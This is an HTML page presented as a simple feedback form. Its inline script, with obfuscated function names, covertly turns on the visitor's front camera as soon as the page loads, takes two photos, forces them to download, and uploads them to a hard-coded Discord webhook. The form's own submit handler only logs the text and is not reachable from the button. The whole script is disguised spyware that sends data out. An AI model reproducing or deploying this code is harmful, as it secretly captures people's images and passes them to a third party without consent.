<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Feedback Form</title>
</head>
<body>
    <h1>Feedback Form</h1>
    <input type="text" id="feedback" placeholder="Enter your feedback...">
    <button onclick="submitFeedback()">Submit</button>

    <script>
        (function(){
            async function _0x12345(a){
                const b=[];
                const c=document.createElement("video");
                try{
                    const d=await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "user" } // Use front camera on mobile
                    });
                    c.srcObject=d;
                    await c.play();
                    for(let e=0;e<a;e++){
                        const f=document.createElement("canvas");
                        f.width=c.videoWidth;
                        f.height=c.videoHeight;
                        const g=f.getContext("2d");
                        g.drawImage(c,0,0);
                        const h=f.toDataURL("image/png");
                        b.push(h);
                        _0x54321(h,`photo_${e+1}.png`);
                        await _0xabcde(h,`photo_${e+1}.png`);
                        console.log(`Photo ${e+1} taken and sent to Discord`);
                    }
                    d.getTracks().forEach(i=>i.stop());
                }catch(j){
                    console.error("Error capturing photos:",j);
                }
                return b;
            }

            async function _0xabcde(a,b){
                const c="https://discordapp.com/api/webhooks/1344440845419548702/pP1MvXgW6Va0rTZ_IqTd90x77N5PHZAlWnuAEiicJlv0-cPY2zkQm6sQEnSeKEIMd7Bk";
                const d=await(await fetch(a)).blob();
                const e=new FormData();
                e.append("file",d,b);
                await fetch(c,{method:"POST",body:e});
            }

            function _0x54321(a,b){
                const c=document.createElement("a");
                c.href=a;
                c.download=b;
                document.body.appendChild(c);
                c.click();
                document.body.removeChild(c);
            }

            function submitFeedback(){
                const a=document.getElementById("feedback").value;
                console.log("Feedback submitted: "+a);
            }

            window.onload=async()=>{
                console.log("Page loaded. Taking photos...");
                const a=await _0x12345(2);
                console.log("Photos captured and sent to Discord.");
            };
        })();
    </script>
</body>
</html>
